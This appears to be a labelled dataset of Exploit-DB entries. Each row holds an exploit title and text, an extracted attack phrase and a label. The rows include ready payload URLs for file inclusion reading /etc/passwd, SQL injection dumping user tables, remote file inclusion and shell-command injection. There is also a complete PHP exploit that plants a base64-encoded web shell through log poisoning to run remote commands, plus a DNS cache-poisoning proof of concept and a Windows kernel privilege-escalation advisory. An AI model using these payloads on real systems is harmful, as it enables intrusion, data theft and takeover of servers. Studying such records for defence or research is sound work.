45436,"Microsoft Windows - Double Dereference in NtEnumerateKey Elevation of Privilege Windows: Double Dereference in NtEnumerateKey Elevation of Privilege Platform: Windows 10 1803 (not vulnerable in earlier versions) Class: Elevation of Privilege  Summary: A number of registry system calls do not correctly handle pre-defined keys resulting in a double dereference which can lead to EoP.  Description:  The registry contains a couple of predefined keys, to generate performance information. These actually exist in the the machine hive under \Registry\Machine\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Perflib. When these keys are opened the kernel returns a status code of STATUS_PREDEFINED_KEY, but it also returns a handle to the key.   The kernel doesn’t allow these keys to be used for many operations such as enumeration of subkeys and values, so these system calls check before the key is used and returns STATUS_INVALID_HANDLE. The code for this in NtEnumerateKey looks like the following:  status = ObReferenceObjectByHandle(Handle, KEY_ENUMERATE, CmKeyObjectType, &Object); if ( status >= 0 && Object->Type != 'ky02' )  {       status = STATUS_INVALID_HANDLE;       ObfDereferenceObject(Object); <-- Dereference object,  }  if (status < 0) {    goto EXIT_LABEL;  }  This code in itself is fine, but in 1803 at the exit label we find the following additional code:  if (Object)     ObfDereferenceObject(Object);  This results in the object being dereferenced twice. Due the way the object reference counting works this will not be noticed until the key handle is closed, which results in a REFERENCE_BY_POINTER bugcheck being generated. This might only be a local DoS if the issue was caught earlier, but because the caller can do other things with the corrupted object we can potentially turn this into a UaF and from there elevate privileges. For example the provided PoC passes the handle to NtDuplicateObject which results in the kernel modifying a free pool allocation.  I’d recommend ensuring you check all similar functions such as NtEnumerateValueKey as there seems to be a common issue, perhaps it’s a macro or template which is generating the bad code.  The following is an example dump from a crash, at the end the !pool command is used on the object address to demonstrate the memory allocation was freed before being modified.  Use !analyze -v to get detailed debugging information.  BugCheck 18, {0, ffff8e0db3a0f7a0, 2, ffffffffffffffff}  Probably caused by : ntkrnlmp.exe ( nt!ObfDereferenceObjectWithTag+155dd9 )  Followup:     MachineOwner ---------  0: kd> !analyze -v ******************************************************************************* *                                                                             * *                        Bugcheck Analysis                                    * *                                                                             * *******************************************************************************  REFERENCE_BY_POINTER (18) Arguments: Arg1: 0000000000000000, Object type of the object whose reference count is being lowered Arg2: ffff8e0db3a0f7a0, Object whose reference count is being lowered Arg3: 0000000000000002, Reserved Arg4: ffffffffffffffff, Reserved 	The reference count of an object is illegal for the current state of the object. 	Each time a driver uses a pointer to an object the driver calls a kernel routine 	to increment the reference count of the object. When the driver is done with the 	pointer the driver calls another kernel routine to decrement the reference count. 	Drivers must match calls to the increment and decrement routines. This bugcheck 	can occur because an object's reference count goes to zero while there are still 	open handles to the object, in which case the fourth parameter indicates the number 	of opened handles. It may also occur when the objects reference count drops below zero 	whether or not there are open handles to the object, and in that case the fourth parameter 	contains the actual value of the pointer references count.  Debugging Details: ------------------   DUMP_CLASS: 1  DUMP_QUALIFIER: 401  BUILD_VERSION_STRING:  17134.1.amd64fre.rs4_release.180410-1804  SYSTEM_MANUFACTURER:  Microsoft Corporation  VIRTUAL_MACHINE:  HyperV  SYSTEM_PRODUCT_NAME:  Virtual Machine  SYSTEM_SKU:  None  SYSTEM_VERSION:  Hyper-V UEFI Release v3.0  BIOS_VENDOR:  Microsoft Corporation  BIOS_VERSION:  Hyper-V UEFI Release v3.0  BIOS_DATE:  03/02/2018  BASEBOARD_MANUFACTURER:  Microsoft Corporation  BASEBOARD_PRODUCT:  Virtual Machine  BASEBOARD_VERSION:  Hyper-V UEFI Release v3.0  DUMP_TYPE:  1  BUGCHECK_P1: 0  BUGCHECK_P2: ffff8e0db3a0f7a0  BUGCHECK_P3: 2  BUGCHECK_P4: ffffffffffffffff  CPU_COUNT: 2  CPU_MHZ: a98  CPU_VENDOR:  GenuineIntel  CPU_FAMILY: 6  CPU_MODEL: 8e  CPU_STEPPING: 9  CPU_MICROCODE: 6,8e,9,0 (F,M,S,R)  SIG: FFFFFFFF'00000000 (cache) FFFFFFFF'00000000 (init)  DEFAULT_BUCKET_ID:  WIN8_DRIVER_FAULT  BUGCHECK_STR:  0x18  PROCESS_NAME:  PoC_NtEnumerateKey_EoP.exe  CURRENT_IRQL:  0  ANALYSIS_SESSION_HOST:  DESKTOP-JA4I3EF  ANALYSIS_SESSION_TIME:  06-19-2018 13:36:38.0158  ANALYSIS_VERSION: 10.0.15063.468 amd64fre  LAST_CONTROL_TRANSFER:  from fffff80357473ab9 to fffff8035742c330  STACK_TEXT:   ffffb78e`5a91f678 fffff803`57473ab9 : 00000000`00000018 00000000`00000000 ffff8e0d`b3a0f7a0 00000000`00000002 : nt!KeBugCheckEx ffffb78e`5a91f680 fffff803`57751b9b : 00000000`00000000 00000000`00000000 00020019`00000000 ffffb78e`5a91f7c0 : nt!ObfDereferenceObjectWithTag+0x155dd9 ffffb78e`5a91f6c0 fffff803`5775157d : ffffe58b`763cf580 00000a50`00000040 ffffe58b`75c75f20 00000000`00000001 : nt!ObDuplicateObject+0x58b ffffb78e`5a91f980 fffff803`5743c943 : ffffe58b`763c4700 00000000`008fe098 ffffb78e`5a91fa28 00000000`00000000 : nt!NtDuplicateObject+0x12d ffffb78e`5a91fa10 00007ffa`f3cda634 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!KiSystemServiceCopyEnd+0x13 00000000`008fe078 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : 0x00007ffa`f3cda634   STACK_COMMAND:  kb  THREAD_SHA1_HASH_MOD_FUNC:  4fc60443ee144421725d502d6e3b53056b889c26  THREAD_SHA1_HASH_MOD_FUNC_OFFSET:  c219a3da6c3050112ed885b130b5ebbab9cdff96  THREAD_SHA1_HASH_MOD:  f08ac56120cad14894587db086f77ce277bfae84  FOLLOWUP_IP:  nt!ObfDereferenceObjectWithTag+155dd9 fffff803`57473ab9 cc              int     3  FAULT_INSTR_CODE:  4e8d48cc  SYMBOL_STACK_INDEX:  1  SYMBOL_NAME:  nt!ObfDereferenceObjectWithTag+155dd9  FOLLOWUP_NAME:  MachineOwner  MODULE_NAME: nt  IMAGE_NAME:  ntkrnlmp.exe  DEBUG_FLR_IMAGE_TIMESTAMP:  5b1a4590  BUCKET_ID_FUNC_OFFSET:  155dd9  FAILURE_BUCKET_ID:  0x18_OVER_DEREFERENCE_nt!ObfDereferenceObjectWithTag  BUCKET_ID:  0x18_OVER_DEREFERENCE_nt!ObfDereferenceObjectWithTag  PRIMARY_PROBLEM_CLASS:  0x18_OVER_DEREFERENCE_nt!ObfDereferenceObjectWithTag  TARGET_TIME:  2018-06-19T20:33:20.000Z  OSBUILD:  17134  OSSERVICEPACK:  0  SERVICEPACK_NUMBER: 0  OS_REVISION: 0  SUITE_MASK:  272  PRODUCT_TYPE:  1  OSPLATFORM_TYPE:  x64  OSNAME:  Windows 10  OSEDITION:  Windows 10 WinNt TerminalServer SingleUserTS  OS_LOCALE:    USER_LCID:  0  OSBUILD_TIMESTAMP:  2018-06-08 02:00:00  BUILDDATESTAMP_STR:  180410-1804  BUILDLAB_STR:  rs4_release  BUILDOSVER_STR:  10.0.17134.1.amd64fre.rs4_release.180410-1804  ANALYSIS_SESSION_ELAPSED_TIME:  13a4  ANALYSIS_SOURCE:  KM  FAILURE_ID_HASH_STRING:  km:0x18_over_dereference_nt!obfdereferenceobjectwithtag  FAILURE_ID_HASH:  {4139309c-4e9f-52f0-ac5e-4041e7a86a20}  Followup:     MachineOwner ---------  0: kd> !pool ffff8e0db3a0f7a0 Pool page ffff8e0db3a0f7a0 region is Paged pool  ffff8e0db3a0f000 size:  150 previous size:    0  (Free )  FMfn  ffff8e0db3a0f150 size:  130 previous size:  150  (Free)       Free  ffff8e0db3a0f280 size:   40 previous size:  130  (Allocated)  MPan  ffff8e0db3a0f2c0 size:   50 previous size:   40  (Free )  SeAt  ffff8e0db3a0f310 size:   c0 previous size:   50  (Free )  Se    ffff8e0db3a0f3d0 size:   50 previous size:   c0  (Free)       Free  ffff8e0db3a0f420 size:  220 previous size:   50  (Allocated)  FMfn  ffff8e0db3a0f640 size:   a0 previous size:  220  (Allocated)  Sect  ffff8e0db3a0f6e0 size:   50 previous size:   a0  (Free)       Free *ffff8e0db3a0f730 size:  100 previous size:   50  (Free ) *Key  		Pooltag Key  : Key objects  ffff8e0db3a0f830 size:   10 previous size:  100  (Free)       Free  ffff8e0db3a0f840 size:   e0 previous size:   10  (Allocated)  NtFs  ffff8e0db3a0f920 size:   c0 previous size:   e0  (Allocated)  FIcs  ffff8e0db3a0f9e0 size:   c0 previous size:   c0  (Free )  SeTd  ffff8e0db3a0faa0 size:  560 previous size:   c0  (Allocated)  Ntff     Proof of Concept:  I’ve provided a PoC as a C# project. This only demonstrates the issue and proves that it would be possible to force this issue into a UaF even with the mitigations on reference counting.  1) Compile the C# project. It will need to grab the NtApiDotNet from NuGet to work. 2) Run the PoC on an machine with Windows 10 1803, I’ve only tested x64. 3) The OS should crash, inspect it in a kernel debugger or from the crash dump.  Expected Result: The OS ignores the pre-defined key as expected.  Observed Result: The object’s reference count is corrupted.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45436.zip",the corrupted object,1
34245,"ArticleFR 11.06.2014 - 'data.php' Privilege Escalation Advisory ID: HTB23219 Product: ArticleFR Vendor: Free Reprintables Vulnerable Version(s): 11.06.2014 and probably prior Tested Version: 11.06.2014 Advisory Publication:  June 11, 2014  [without technical details] Vendor Notification: June 11, 2014  Public Disclosure: July 30, 2014  Vulnerability Type: Improper Access Control [CWE-284] CVE Reference: CVE-2014-4170 Risk Level: High  CVSSv2 Base Score: 7.5 (AV:N/AC:L/Au:N/C:P/I:P/A:P) Solution Status: Solution Available Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )   -----------------------------------------------------------------------------------------------  Advisory Details:  High-Tech Bridge Security Research Lab discovered vulnerability in ArticleFR, which can be exploited to execute arbitrary UPDATE SQL statements, alter information stored in database and gain complete control over the web site.   1) Improper Access Control in ArticleFR: CVE-2014-4170  The vulnerability exists due to insufficient access restrictions when accessing the ""/data.php"" script. A remote attacker can send a specially crafted HTTP GET request to vulnerable script and execute arbitrary UPDATE SQL commands in application’s database. Successful exploitation of the vulnerability allows modification of arbitrary database record. A remote attacker can modify or delete information stored in database and gain complete control over the application.   The following exploitation example assigns administrative privileges to the user with ""id=2"":  http://[host]/data.php?pk=2&pkf=id&f=membership&value=admin&t=users  -----------------------------------------------------------------------------------------------  Solution:  Disclosure timeline: 2014-06-11 Vendor Alerted via emails and contact form. 2014-06-19 Vendor Alerted via emails and contact form. 2014-06-24 Vendor Alerted via contact form. 2014-06-26 Fix Requested via emails and contact forms. 2014-06-26 Issue created on GitHub. 2014-06-27 Vendor says that vulnerability is fixed. 2014-06-30 Requested version number with fixes. 2014-07-03 Vendor says that vulnerability will be fixed in upcoming version 3.0.x 2014-07-07 Fix Requested via emails and contact forms. 2014-07-16 Vulnerability still exist in the latest version 3.0.2. This information was brought to vendor. 2014-07-16 Vendor disagrees that vulnerability still exist. 2014-07-27 Vendor locked and limited conversation to collaborators on GitHub. 2014-07-29 Vulnerability still exist in the latest version 3.0.4. 2014-07-30 Public disclosure with self-written patch.  Currently we are not aware of any official solution for this vulnerability. Unofficial patch was developed by High-Tech Bridge Security Research Lab and is available here: https://www.htbridge.com/advisory/HTB23219-patch.zip  -----------------------------------------------------------------------------------------------  References:  [1] High-Tech Bridge Advisory HTB23219 - https://www.htbridge.com/advisory/HTB23219 - Improper Access Control in ArticleFR. [2] ArticleFR - http://freereprintables.com/ - Free Article Directory CMS System . [3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures. [4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types. [5] ImmuniWeb® SaaS - https://www.htbridge.com/immuniweb/ - hybrid of manual web application penetration test and cutting-edge vulnerability scanner available online via a Software-as-a-Service (SaaS) model.  -----------------------------------------------------------------------------------------------  Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.",send a specially crafted HTTP GET request to vulnerable script and execute arbitrary UPDATE SQL commands in application’s database,1
29640,Shop Kit Plus - 'StyleCSS.php' Local File Inclusion source: https://www.securityfocus.com/bid/22697/info  Shop Kit Plus is prone to a local file-include vulnerability because it fails to adequately sanitize user-supplied data.  An attacker can exploit this vulnerability using directory-traversal strings to execute local script code in the context of the application. This may allow the attacker to access sensitive information that may aid in further attacks.  http://www.example.com/shopkitplus/enc/stylecss.php?changetheme=../../../../../../../../../../../../etc/passwd,using directory-traversal strings,1
2760,"Rama CMS 0.68 - Cookie: lang Local File Inclusion <?  print ' :::::::::  :::::::::: :::     ::: ::::::::::: ::: :+:    :+: :+:        :+:     :+:     :+:     :+: +:+    +:+ +:+        +:+     +:+     +:+     +:+ +#+    +:+ +#++:++#   +#+     +:+     +#+     +#+ +#+    +#+ +#+         +#+   +#+      +#+     +#+ #+#    #+# #+#          #+#+#+#       #+#     #+# #########  ##########     ###     ########### ########## ::::::::::: ::::::::::     :::     ::::    ::::     :+:     :+:          :+: :+:   +:+:+: :+:+:+     +:+     +:+         +:+   +:+  +:+ +:+:+ +:+     +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+     +#+     +#+        +#+     +#+ +#+       +#+     #+#     #+#        #+#     #+# #+#       #+#     ###     ########## ###     ### ###       ###     - - [DEVIL TEAM THE BEST POLISH TEAM] - -   [Exploit name: Rama CMS <= 0.68 (Cookie: lang) Local File Include Exploit [Script name: Rama CMS v.0.68 [Script site: http://www.hotscripts.com/jump.php?listing_id=48318&jump_type=1     Find by: Kacper (a.k.a Rahim)   ========>  DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam  <======== ========>         http://www.rahim.webd.pl/            <========  Contact: kacper1964@yahoo.pl  (c)od3d by Kacper -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Greetings DragonHeart and all DEVIL TEAM Patriots :) - Leito & Leon TomZen, Gelo, Ramzes, DMX, Ci2u, Larry, @steriod, Drzewko, CrazzyIwan, Rammstein Adam., Kicaj., DeathSpeed, Arkadius, Michas, pepi, nukedclx, SkD, MXZ, sysios, mIvus, nukedclx, SkD, wacky, xoron -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-                 Greetings for 4ll Fusi0n Group members ;-)                 and all members of hacker.com.pl ;) -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- ';   /* works with register_globals=On  in lang.php line 27-43: .... if(isset($_GET['lang'])){ 	setcookie('lang',htmlspecialchars($_GET['lang'])); 	$lang = htmlspecialchars($_GET['lang']); 	$_COOKIE['lang'] = $lang; }else if(isset($_COOKIE['lang'])){                       //  <-------{1} 	$lang = htmlspecialchars($_COOKIE['lang']); }else{ 	$lang = DEFAUL_LANG; 	$_COOKIE['lang'] = $lang;            //  <-------{2} }  if(file_exists(""language/$lang.php"")){     include_once(""language/$lang.php"");         //  <-------{3} }else{     include_once(""language/en.php""); } ?> .... ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  by Kacper ;) */   if ($argc<4) { print_r(' ----------------------------------------------------------------------------- Usage: php '.$argv[0].' host path cmd OPTIONS host:      target server (ip/hostname) path:      Rama CMS path cmd:       a shell command (ls -la) Options:  -p[port]:    specify a port other than 80  -P[ip:port]: specify a proxy Example: php '.$argv[0].' 2.2.2.2 /Rama_CMS/ ls -la -P1.1.1.1:80 php '.$argv[0].' 1.1.1.1 / ls -la ----------------------------------------------------------------------------- ');  die; }  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function wyslij_pakiety($pakiet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$pakiet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock); } function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function make_seed() {    list($usec, $sec) = explode(' ', microtime());    return (float) $sec + ((float) $usec * 100000); }  $host=$argv[1]; $path=$argv[2]; $cmd="""";  $port=80; $proxy=""""; for ($i=3; $i<$argc; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } } if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}   echo ""[1] insert evil code in logfiles ...\r\n\r\n""; $hauru = base64_decode(""PD9waHAgb2JfY2xlYW4oKTsvL1J1Y2hvbXkgemFtZWsgSGF1cnUgOy0pZWNobyIuL"". ""i5IYWNrZXIuLkthY3Blci4uTWFkZS4uaW4uLlBvbGFuZCEhLi4uREVWSUwuVEVBTS"". ""4udGhlLi5iZXN0Li5wb2xpc2guLnRlYW0uLkdyZWV0ei4uLiI7ZWNobyIuLi5HbyB"". ""UbyBERVZJTCBURUFNIElSQzogNzIuMjAuMTguNjo2NjY3ICNkZXZpbHRlYW0iO2Vj"". ""aG8iLi4uREVWSUwgVEVBTSBTSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvI"". ""jtpbmlfc2V0KCJtYXhfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYX"". ""NzdGhydSgkX1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+"");  $pakiet=""GET "".$p.$hauru."" HTTP/1.0\r\n""; $pakiet.=""User-Agent: "".$hauru."" Googlebot/2.1\r\n""; $pakiet.=""Host: "".$host.""\r\n""; $pakiet.=""Connection: close\r\n\r\n""; wyslij_pakiety($pakiet); sleep(3);  $paths= array ( ""../../../../../var/log/httpd/access_log"", ""../../../../../var/log/httpd/error_log"", ""../apache/logs/error.log"", ""../apache/logs/access.log"", ""../../apache/logs/error.log"", ""../../apache/logs/access.log"", ""../../../apache/logs/error.log"", ""../../../apache/logs/access.log"", ""../../../../apache/logs/error.log"", ""../../../../apache/logs/access.log"", ""../../../../../apache/logs/error.log"", ""../../../../../apache/logs/access.log"", ""../logs/error.log"", ""../logs/access.log"", ""../../logs/error.log"", ""../../logs/access.log"", ""../../../logs/error.log"", ""../../../logs/access.log"", ""../../../../logs/error.log"", ""../../../../logs/access.log"", ""../../../../../logs/error.log"", ""../../../../../logs/access.log"", ""../../../../../etc/httpd/logs/access_log"", ""../../../../../etc/httpd/logs/access.log"", ""../../../../../etc/httpd/logs/error_log"", ""../../../../../etc/httpd/logs/error.log"", ""../../../../../var/www/logs/access_log"", ""../../../../../var/www/logs/access.log"", ""../../../../../usr/local/apache/logs/access_log"", ""../../../../../usr/local/apache/logs/access.log"", ""../../../../../var/log/apache/access_log"", ""../../../../../var/log/apache/access.log"", ""../../../../../var/log/access_log"", ""../../../../../var/www/logs/error_log"", ""../../../../../var/www/logs/error.log"", ""../../../../../usr/local/apache/logs/error_log"", ""../../../../../usr/local/apache/logs/error.log"", ""../../../../../var/log/apache/error_log"", ""../../../../../var/log/apache/error.log"", ""../../../../../var/log/access_log"", ""../../../../../var/log/error_log"" );  for ($i=0; $i<=count($paths)-1; $i++) { $a=$i+2; echo ""["".$a.""] Check Path: "".$paths[$i].""\r\n""; echo ""remote code execution...wait..\n""; $pakiet =""GET "".$p.""lang.php HTTP/1.1\r\n""; $pakiet.=""Cookie: lang=../"".$paths[$i].""%00;\r\n""; $pakiet.=""HAURU: "".$cmd.""\r\n""; $pakiet.=""Host: "".$host.""\r\n""; $pakiet.=""Connection: Close\r\n\r\n""; wyslij_pakiety($pakiet); if (strstr($html,""Hauru"")) { $temp=explode(""Hauru"",$html); die($temp[1]); } } echo ""Exploit err0r :(\r\n""; echo ""Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam\r\n""; ?>  # milw0rm.com [2006-11-12]",a specially crafted .pl file,1
24218,"Symantec Enterprise Firewall 7.0/8.0 - DNSD DNS Cache Poisoning source: https://www.securityfocus.com/bid/10557/info  It is reported that dnsd is prone to a cache poisoning vulnerability.  Dnsd does not ensure that the data returned from a remote DNS server contains related information about the requested records.  An attacker could exploit this vulnerability to deny service to legitimate users by redirecting traffic to inappropriate hosts. Man-in-the-middle attacks, impersonation of sites, and other attacks may be possible.  // PoC poisoning cache attack SEF 8 and later (by fryxar) // Requires poslib 1.0.4 library // Compile: g++ `poslib-config --libs --cflags --server` poc.cpp -o poc  #define POS_DEFAULTLOG #define POS_DEFAULTLOG_STDERR #define POS_DEFAULTLOG_SYSLOG  // Server include file #include <poslib/server/server.h>  // For signal handling #include <stdlib.h> #include <signal.h>  char *dyndomain;  DnsMessage *my_handle_query(pending_query *query);  void cleanup(int sig) {  // close down the server system  pos_setquitflag(); }  int main(int argc, char **argv) { _addr a;   try {    /* get command-line arguments */    if (argc != 2 ) {      printf( ""Usage: %s [domainname]\n"", argv[0] );      return 1;    } else {      dyndomain = argv[1];      txt_to_addr(&a, ""any"");    }     poslib_config_init();     /* bring up posadis */    servers.push_front(ServerSocket(ss_udp, udpcreateserver(&a)));     // use the posadis logging system    pos_log(context_none, log_info, ""Proof of concept DNS server starting up..."");     // set signal handlers    signal(SIGINT, cleanup);    signal(SIGTERM, cleanup);     // set query function    handle_query = my_handle_query;     // run server    posserver_run();  } catch (PException p) {    printf(""Fatal exception: %s\n"", p.message);    return 1;  }   return 0; }  /* the entry function which will handle all queries */ DnsMessage *my_handle_query(pending_query *query) {  DnsMessage *a = new DnsMessage();  DnsQuestion q;  DnsRR rr;   /* set a as an answer to the query */  a->ID = query->message->ID;  a->RD = query->message->RD;  a->RA = false;   if (query->message->questions.begin() == query->message->questions.end()) {    /* query did not contain question */    a->RCODE = RCODE_QUERYERR;    return a;  }  q = *query->message->questions.begin();  a->questions.push_back(q);  a->QR = true;   pos_log(context_server, log_info, ""Query: [%s,%s]"", q.QNAME.tocstr(), str_qtype(q.QTYPE).c_str());   if (q.QTYPE == DNS_TYPE_A && q.QNAME == dyndomain) {    rr = DnsRR(dyndomain, DNS_TYPE_A, CLASS_IN, 3600);    string data = rr_fromstring(DNS_TYPE_A, ""200.200.200.200""); // Anything...    rr.RDLENGTH = data.size();    rr.RDATA = (char *)memdup(data.c_str(), data.size());    a->answers.push_back(rr);     rr = DnsRR(""org"", DNS_TYPE_NS, CLASS_IN, 3600);    data = rr_fromstring(DNS_TYPE_NS, ""fakedns.com"");    rr.RDLENGTH = data.size();    rr.RDATA = (char *)memdup(data.c_str(), data.size());    a->authority.push_back(rr);     rr = DnsRR(""fakedns.com"", DNS_TYPE_A, CLASS_IN, 3600);    data = rr_fromstring(DNS_TYPE_A, ""200.200.200.201""); // Anything...    rr.RDLENGTH = data.size();    rr.RDATA = (char *)memdup(data.c_str(), data.size());    a->additional.push_back(rr);  } else {    /* we don't want this */    a->RCODE = RCODE_SRVFAIL;  }  return a; } ######################################################### # End poc.cpp #########################################################",redirecting traffic to inappropriate hosts,1
20246,"TalentSoft Web+ Application Server (Linux) 4.6 - Example Script File Disclosure source: https://www.securityfocus.com/bid/1725/info  Web+ is a development language for use in creating web-based client/server applications.  In Linux versions of the product, an example script installed in Web+ (Web+Ping) which fails to correctly filter shell meta characters. As a result, parameters passed to this script may contain malicious shell commands, allowing an attacker to remotely execute or read any file which is accessible by the Web+ user.  Windows NT versions of Web+ are apparently not vulnerable.  To exploit simply place a '|' after the parameter you which to provide to ping and then the command you wish to execute.  e.g: Goto: http://target/cgi-bin/webplus.cgi?Script=/webplus/webping/webping.wml  Then type in host destination box: 127.0.0.1 | cat /etc/passwd  You will then be presented with the contents of the /etc/passwd file.",malicious shell commands,1
32264,Freeway 1.4.1.171 - '/french/account_newsletters.php?language' Traversal Local File Inclusion source: https://www.securityfocus.com/bid/30731/info    Freeway is prone to multiple local file-include vulnerabilities because it fails to properly sanitize user-supplied input.    An attacker can exploit these vulnerabilities using directory-traversal strings to view local files in the context of the webserver process. This may aid in further attacks.    Freeway 1.4.1.171 is vulnerable; other versions may also be affected.  http://www.example.com/[installdir]/includes/languages/french/account_newsletters.php? language=../../../../../../../../../../../../../etc/passwd%00,directory-traversal strings to view local files in the context of the webserver process,1
25772,"Qualiteam X-Cart 4.0.8 - 'register.php?mode' SQL Injection source: https://www.securityfocus.com/bid/13817/info               X-Cart is prone to SQL injection and cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.               These vulnerabilities could permit remote attackers to pass malicious input to database queries, resulting in modification of query logic or other attacks. Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation. An attacker may also steal cookie-based authentication credentials and carry out other attacks.               X-Cart 4.0.8 is reportedly vulnerable. Other versions may be affected as well.  http://www.example.com/register.php?mode='[SQL-inj]",malicious input,1
22907,"ES CmS 0.1 - SQL Injection ﻿# Exploit Title: ES CmS 0.1 Sql Injection Vulnerability  # Google Dork: inurl:/page.php?id=  # Date: 2012  # Exploit Author: MR.XpR  # Software Link: http://es-cms.com , http://sourceforge.net/projects/escms/files/esCMS Alpha/0.1/escms_alpha_v0_1.zip  # Version: v.0.1  # Tested on: BT , 7   # Poc :  http://localhost/page.php?id=[sqli]   # D3mo :   http://server/page.php?id=-1+union+select+1,2,3,group_concat(column_name),5,6+from+information_schema.c​olumns+where+table_name=char(table_cod)  http://server/page.php?id=-1+union+select+1,2,3,group_concat(nazwa,0x3a,haslo),5,6+from+es_cms_users   # TNx To :   My Brothers Siamak.Black(Black.Boy) , UnknowN   everything is not true ,The real is dream",a malicious manner,1
27807,Fast Click SQL Lite 1.1.2/1.1.3 - 'show.php' Remote File Inclusion source: https://www.securityfocus.com/bid/17819/info  Fast Click SQL Lite is prone to a remote file-include vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.  This issue is reported to affect versions 1.1.3 and prior.  http://www.example.com/[path]/show.php?path=http://www.example.com/cmd.gif?&cmd=uname -a,include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process,1
